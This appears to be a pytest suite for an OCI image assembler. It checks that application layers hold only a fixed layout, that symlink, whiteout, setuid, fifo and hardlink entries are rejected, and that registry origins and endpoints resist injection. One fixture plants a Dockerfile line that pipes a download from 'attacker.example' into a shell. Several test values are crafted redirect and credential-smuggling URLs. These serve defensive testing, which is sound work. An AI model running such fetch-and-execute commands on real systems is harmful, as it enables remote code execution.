"""覆盖 AC: AC-15、AC-16、AC-25、AC-27、AC-28、AC-42、AC-54."""

import json
import os
import tarfile
from types import SimpleNamespace

import pytest

from runtime_manager.executors.protocol import ExecutorError
from tests.test_kubernetes_executor import runtime as runtime

IMAGE = "registry.example/python@sha256:" + "a" * 64


@pytest.fixture
def tree(tmp_path):
    source, environment = tmp_path / "source", tmp_path / "environment"
    source.mkdir()
    environment.mkdir()
    (source / "main.py").write_text("print('app')")
    (source / "Procfile").write_text("web: python main.py\n")
    (environment / "bin").mkdir()
    (environment / "bin/python").symlink_to("/usr/local/bin/python3.11")
    return source, environment, tmp_path


def document():
    return {
        "platform": "linux/amd64",
        "runtime": "python3.11",
        "port": 8080,
        "profile": {"runtime_image": IMAGE, "uid": 10001, "gid": 10001},
        "startup": {"command": []},
    }


def test_layer_contains_only_fixed_layout_with_platform_entrypoint(tree):
    from runtime_manager.oci_assembler import write_layer

    source, environment, root = tree
    (source / "Dockerfile").write_text("RUN curl attacker.example/execute | sh")
    target = root / "layer.tar"
    write_layer(document(), source, environment, target)
    with tarfile.open(target) as archive:
        names = archive.getnames()
        assert "app/main.py" in names and "opt/venv/bin/python" in names
        assert not any(n.startswith("run/") or n.startswith("etc/passwd") for n in names)
        assert archive.getmember("opt/venv/bin/python").linkname == "/usr/local/bin/python3.11"
        entry = archive.extractfile("usr/local/bin/bisheng-app-entrypoint").read()
        assert b"UVICORN_ROOT_PATH" in entry and b"exec" in entry
        assert all(item.uid == item.gid == 10001 for item in archive.getmembers())


@pytest.mark.parametrize("attack", ["link", "whiteout", "setuid", "fifo", "external-hardlink"])
def test_unsafe_application_entries_are_rejected(tree, attack):
    from runtime_manager.oci_assembler import write_layer

    source, environment, root = tree
    if attack == "link":
        (source / "escape").symlink_to("/run/registry/config.json")
    elif attack == "whiteout":
        (source / ".wh.etc").write_text("")
    elif attack == "setuid":
        (source / "main.py").chmod(0o4755)
    elif attack == "fifo":
        os.mkfifo(source / "pipe")
    else:
        (root / "private").write_text("private")
        os.link(root / "private", source / "hardlink")
    with pytest.raises(ExecutorError):
        write_layer(document(), source, environment, root / "layer.tar")


def test_crane_only_mutates_frozen_base_and_never_runs_source(tree):
    from runtime_manager.oci_assembler import assemble_image

    source, environment, root = tree
    seen = []

    def run(args, **kwargs):
        seen.append(args)
        if "config" in args:
            return SimpleNamespace(stdout=json.dumps({"os": "linux", "architecture": "amd64"}), returncode=0)
        assert "mutate" in args and "--append" in args and "--entrypoint" in args
        assert "RUN" not in " ".join(args) and "docker" not in args
        return SimpleNamespace(stdout="registry.example/apps@sha256:" + "b" * 64 + "\n", returncode=0)

    result = assemble_image(document(), source, environment, "registry.example/apps:operation", work=root, run=run)
    assert result["image_ref"].endswith("@sha256:" + "b" * 64)
    assert result["mode"] == "source-image" and result["startup"] == {}
    assert seen[0][-1] == IMAGE


def test_wrong_base_architecture_and_missing_registry_are_explicit(tree):
    from runtime_manager.oci_assembler import assemble_image

    source, environment, root = tree

    def run(*args, **kwargs):
        return SimpleNamespace(stdout=json.dumps({"os": "linux", "architecture": "arm64"}), returncode=0)

    with pytest.raises(ExecutorError, match="platform"):
        assemble_image(document(), source, environment, "registry.example/apps:operation", work=root, run=run)
    with pytest.raises(ExecutorError, match="registry"):
        assemble_image(document(), source, environment, "", work=root, run=run)


def test_registry_secret_is_only_on_the_trusted_assembler(runtime):
    from runtime_manager.oci_assembler import KubernetesAssembler

    executor, _platform, _cluster, operation, _, _ = runtime
    operation.update(kind="prepare", stage="preparing")
    operation["payload"]["profile"] = operation["payload"]["resolved_delivery"]["profile"]
    executor.document.update(
        assembler_image=IMAGE, image_repository="registry.example/apps", registry_secret="runtime-registry-auth"
    )
    seen = []

    def phase(op, stage, purpose, document, **kwargs):
        from runtime_manager.k8s_templates import pod_template

        seen.append(pod_template(kwargs["plan"]))
        return {"mode": "source-image", "image_ref": IMAGE}

    executor.probe_report = lambda: {"ready": True, "paths": {"source-image": True}}
    executor._phase = phase
    result = KubernetesAssembler(executor).prepare(operation, {"mode": "bundle"})
    assert result["mode"] == "source-image"
    pod = seen[0]
    container = pod["spec"]["containers"][0]
    assert container["name"] == "assembler"
    assert any(v["name"] == "registry-auth" for v in container["volumeMounts"])
    assert not any(v["name"] == "material-auth" for v in pod["spec"]["volumes"])


def test_venv_relative_python_links_still_resolve_only_to_the_frozen_interpreter(tree):
    from runtime_manager.oci_assembler import write_layer

    source, environment, root = tree
    (environment / "bin/python3").symlink_to("python")
    write_layer(document(), source, environment, root / "layer.tar")
    (environment / "bin/python").unlink()
    (environment / "bin/python").symlink_to("/run/registry/config.json")
    with pytest.raises(ExecutorError, match="link"):
        write_layer(document(), source, environment, root / "other.tar")


@pytest.mark.parametrize(
    "report",
    [
        {},
        {"paths": {}},
        {"ready": False, "paths": {"source-image": True}},
        {"ready": True, "paths": {"source-image": False}},
    ],
)
def test_source_image_requires_verified_path_before_any_cluster_io(runtime, report):
    from runtime_manager.oci_assembler import KubernetesAssembler

    executor, platform, _cluster, operation, _, _ = runtime
    operation["payload"]["profile"] = operation["payload"]["resolved_delivery"]["profile"]
    executor.document.update(assembler_image=IMAGE, image_repository="registry.example/apps")
    executor.probe_report = lambda: report
    executor._plan = lambda *args, **kwargs: pytest.fail("blocked path must not create an assembly plan")
    platform.egress = lambda *args, **kwargs: pytest.fail("blocked path must not issue outbound credentials")
    with pytest.raises(ExecutorError, match="source_image_unavailable"):
        KubernetesAssembler(executor).prepare(operation, {"mode": "bundle"})


@pytest.mark.parametrize(
    "base,repository,insecure,extra,expected",
    [
        (
            "python@sha256:" + "a" * 64,
            "registry.example:5443/team/apps",
            False,
            [],
            {"https://registry-1.docker.io:443", "https://auth.docker.io:443", "https://registry.example:5443"},
        ),
        (
            "dataelement/python@sha256:" + "a" * 64,
            "192.168.1.5:5000/team/apps",
            True,
            ["https://cdn.example:8443"],
            {
                "https://registry-1.docker.io:443",
                "https://auth.docker.io:443",
                "http://192.168.1.5:5000",
                "https://cdn.example:8443",
            },
        ),
        (
            "docker.io/dataelement/python@sha256:" + "a" * 64,
            "dataelement/apps",
            False,
            [],
            {"https://registry-1.docker.io:443", "https://auth.docker.io:443"},
        ),
        (
            "registry.example:5443/team/python@sha256:" + "a" * 64,
            "registry.example:5443/team/apps",
            False,
            ["https://auth.example"],
            {"https://registry.example:5443", "https://auth.example:443"},
        ),
        (
            "192.168.1.5:5000/team/python@sha256:" + "a" * 64,
            "192.168.1.5:5000/team/apps",
            True,
            ["https://private-cdn.example"],
            {"http://192.168.1.5:5000", "https://private-cdn.example:443"},
        ),
    ],
)
def test_registry_sources_are_scoped_origins(base, repository, insecure, extra, expected):
    from runtime_manager.oci_assembler import registry_origins

    assert set(registry_origins(base, repository, endpoints=extra, insecure=insecure)) == expected


@pytest.mark.parametrize(
    "repository",
    [
        "https://registry.example/apps",
        "user:credential@registry.example/apps",
        "registry.example/apps:latest",
        "registry.example/team/../apps",
        "registry.example/apps?redirect=evil",
        "registry.example/apps#fragment",
        "registry.example:99999/apps",
    ],
)
def test_invalid_target_repository_is_rejected_without_credentials(repository):
    from runtime_manager.oci_assembler import registry_origins

    with pytest.raises(ExecutorError, match="registry"):
        registry_origins(IMAGE, repository)


@pytest.mark.parametrize(
    "endpoint",
    [
        "https://user:credential@cdn.example",
        "https://cdn.example/token",
        "https://cdn.example?redirect=evil",
        "https://cdn.example#token",
        "cdn.example",
        "https://cdn.example:99999",
        "https://cdn.example:0",
        "https://cdn.example:",
        "https://cdn.example\\@evil.example",
    ],
)
def test_registry_endpoint_injection_is_rejected(endpoint):
    from runtime_manager.oci_assembler import registry_origins

    with pytest.raises(ExecutorError, match="endpoint"):
        registry_origins(IMAGE, "registry.example/apps", endpoints=[endpoint])


def test_source_image_egress_uses_exact_origins_and_configured_endpoints(runtime):
    from runtime_manager.oci_assembler import KubernetesAssembler

    executor, platform, _cluster, operation, _, _ = runtime
    profile = dict(operation["payload"]["resolved_delivery"]["profile"])
    profile["runtime_image"] = "dataelement/python@sha256:" + "a" * 64
    operation["payload"]["profile"] = profile
    executor.document.update(
        assembler_image=IMAGE,
        image_repository="registry.example:5000/team/apps",
        insecure_registry=True,
        image_registry_endpoints=["https://private-cdn.example"],
    )
    executor.probe_report = lambda: {"ready": True, "paths": {"source-image": True}}
    seen = []
    platform.egress = lambda *args, **kwargs: (
        seen.append(kwargs["package_sources"]) or {"principal": "build", "token": "fixture-build-token"}
    )
    executor._phase = lambda *args, **kwargs: {"mode": "source-image"}
    KubernetesAssembler(executor).prepare(operation, {})
    assert set(seen[0]) == {
        "http://registry.example:5000",
        "https://registry-1.docker.io:443",
        "https://auth.docker.io:443",
        "https://private-cdn.example:443",
    }


def test_insecure_target_does_not_disable_tls_for_a_different_base_registry(tree):
    from runtime_manager.oci_assembler import assemble_image

    source, environment, root = tree
    seen = []

    def run(args, **kwargs):
        seen.append(args)
        if "config" in args:
            assert "--insecure" not in args
            return SimpleNamespace(stdout=json.dumps({"os": "linux", "architecture": "amd64"}), returncode=0)
        if "mutate" in args:
            assert "--insecure" not in args and "--output" in args
            from pathlib import Path

            Path(args[args.index("--output") + 1]).write_bytes(b"local-oci-output")
            return SimpleNamespace(stdout="", returncode=0)
        assert "push" in args and "--insecure" in args
        return SimpleNamespace(stdout="registry.internal:5000/apps@sha256:" + "b" * 64, returncode=0)

    result = assemble_image(
        {**document(), "insecure_registry": True},
        source,
        environment,
        "registry.internal:5000/apps:operation",
        work=root,
        run=run,
    )
    assert result["image_ref"].startswith("registry.internal:5000/apps@sha256:")
    assert len(seen) == 3
    assert not list(root.glob("*.tar"))


def test_mutable_profile_base_is_rejected_before_registry_calls(tree):
    from runtime_manager.oci_assembler import assemble_image

    source, environment, root = tree
    inputs = document()
    inputs["profile"]["runtime_image"] = "registry.example/python:latest"
    with pytest.raises(ExecutorError, match="frozen_base"):
        assemble_image(
            inputs,
            source,
            environment,
            "registry.example/apps:operation",
            work=root,
            run=lambda *a, **k: pytest.fail("mutable image must not contact a registry"),
        )


def test_static_layer_uses_existing_builder_candidate_order_and_ignores_nonselected_outputs(tree):
    from runtime_manager.oci_assembler import write_layer
    from runtime_manager.source_facts import STATIC_ROOT_CANDIDATES

    source, environment, root = tree
    assert STATIC_ROOT_CANDIDATES[0] == "."
    for name in ("public", "dist", "build"):
        (source / name).mkdir()
        (source / name / "index.html").write_text(name)
    inputs = document()
    inputs["runtime"] = "static"
    write_layer(inputs, source, environment, root / "static.tar")
    with tarfile.open(root / "static.tar") as archive:
        assert archive.extractfile("app/www/index.html").read() == STATIC_ROOT_CANDIDATES[1].encode()
        assert "app/main.py" not in archive.getnames()


@pytest.mark.parametrize("mode", ["bundle", "image"])
def test_unavailable_source_image_does_not_block_other_delivery_modes(runtime, mode):
    executor, _platform, _cluster, operation, _, _ = runtime
    executor.probe_report = lambda: {"ready": True, "paths": {"bundle": True, "image": True, "source-image": False}}
    executor.assemble = lambda *args, **kwargs: pytest.fail("other delivery modes must not invoke the assembler")
    operation.update(kind="prepare", stage="preparing")
    operation["payload"].update(
        platform="linux/amd64",
        source_artifact_id="source-a",
        profile=operation["payload"]["resolved_delivery"]["profile"],
        delivery={"mode": mode, "image": IMAGE},
    )
    executor._phase = lambda op, stage, purpose, doc: (
        {"input_key": "c" * 64}
        if stage == "inputs"
        else {"mode": "bundle", "dependency_artifact_id": "dep", "compiled_artifact_id": "compiled"}
        if stage == "upload"
        else {}
    )
    assert executor.prepare(operation)["mode"] == mode


def test_cross_registry_http_push_failure_cleans_local_outputs_and_hides_stderr(tree):
    import subprocess
    from pathlib import Path

    from runtime_manager.oci_assembler import assemble_image

    source, environment, root = tree

    def run(args, **kwargs):
        if "config" in args:
            return SimpleNamespace(stdout=json.dumps({"os": "linux", "architecture": "amd64"}), returncode=0)
        if "mutate" in args:
            Path(args[args.index("--output") + 1]).write_bytes(b"local-oci-output")
            return SimpleNamespace(stdout="", returncode=0)
        raise subprocess.CalledProcessError(1, args, stderr="sensitive-registry-credential")

    with pytest.raises(ExecutorError, match="oci_registry_operation_failed") as caught:
        assemble_image(
            {**document(), "insecure_registry": True},
            source,
            environment,
            "registry.internal:5000/apps:operation",
            work=root,
            run=run,
        )
    assert "sensitive" not in str(caught.value)
    assert not list(root.glob("*.tar"))


def test_docker_hub_result_normalization_keeps_the_exact_repository(tree):
    from runtime_manager.oci_assembler import assemble_image

    source, environment, root = tree
    values = ["index.docker.io/dataelement/apps@sha256:" + "b" * 64]

    def run(args, **kwargs):
        return SimpleNamespace(
            stdout=json.dumps({"os": "linux", "architecture": "amd64"}) if "config" in args else values[0], returncode=0
        )

    result = assemble_image(document(), source, environment, "dataelement/apps:operation", work=root, run=run)
    assert result["image_ref"] == values[0]
    values[0] = "index.docker.io/other/apps@sha256:" + "b" * 64
    with pytest.raises(ExecutorError, match="push_digest_unconfirmed"):
        assemble_image(document(), source, environment, "dataelement/apps:operation", work=root, run=run)
